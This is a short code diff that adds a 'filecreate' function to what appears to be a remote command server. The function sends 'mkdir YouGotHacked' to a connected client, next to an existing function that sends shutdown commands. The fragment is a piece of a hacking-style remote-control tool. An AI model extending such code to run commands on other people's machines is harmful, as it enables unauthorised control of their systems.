@@ -124,6 +124,13 @@ def shutdown():
         print('Command sent to client: ', command)
         break
         
+def filecreate():
+    while True:
+        command = 'mkdir YouGotHacked'
+        command = command.encode()
+        currConn.send(command)
+        print('Command sent to client: ', command)
+        break
     
 if __name__ == '__main__':
     Main().run()
